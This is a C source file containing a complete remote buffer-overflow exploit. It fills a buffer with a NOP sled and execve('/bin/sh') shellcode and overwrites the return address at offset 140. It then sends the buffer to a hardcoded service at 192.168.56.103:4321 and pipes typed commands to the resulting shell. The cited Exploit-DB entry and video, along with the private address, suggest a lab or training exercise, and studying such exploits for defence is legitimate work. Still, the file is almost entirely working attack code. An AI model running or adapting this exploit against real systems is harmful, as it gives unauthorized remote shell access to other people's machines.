#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

/*
https://www.exploit-db.com/exploits/43550
https://www.youtube.com/watch?v=btkuAEbcQ80

*/

int main() {
    const int PAYLOAD_SIZE = 256;
    const int RIP_OFFSET = 140;
    const uint64_t RETURN_ADDRESS = 0x7fffffffe5f0;  
    const char *TARGET_IP = "192.168.56.103";
    const int TARGET_PORT = 4321;

    uint8_t buffer[PAYLOAD_SIZE];
    memset(buffer, 0x90, PAYLOAD_SIZE); 

    // execve("/bin/sh") shellcode 
    const uint8_t shellcode[] = { 0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05 };

    memcpy(buffer, shellcode, sizeof(shellcode));
    memcpy(buffer + RIP_OFFSET, &RETURN_ADDRESS, sizeof(uint64_t));

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return 1;
    }

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_IP, &target.sin_addr);

    if (connect(sockfd, (struct sockaddr*)&target, sizeof(target)) < 0) {
        perror("connect");
        close(sockfd);
        return 1;
    }

    char recv_buf[512] = {0};
    recv(sockfd, recv_buf, sizeof(recv_buf)-1, 0);
    printf("[+] Received: %s\n", recv_buf);

    send(sockfd, buffer, PAYLOAD_SIZE, 0);
    printf("[+] Buffer sent.\n");

    char cmd[256];
    while (1) {
        memset(cmd, 0, sizeof(cmd));
        if (!fgets(cmd, sizeof(cmd), stdin)) break;
        send(sockfd, cmd, strlen(cmd), 0);
    }

    close(sockfd);
    return 0;
}
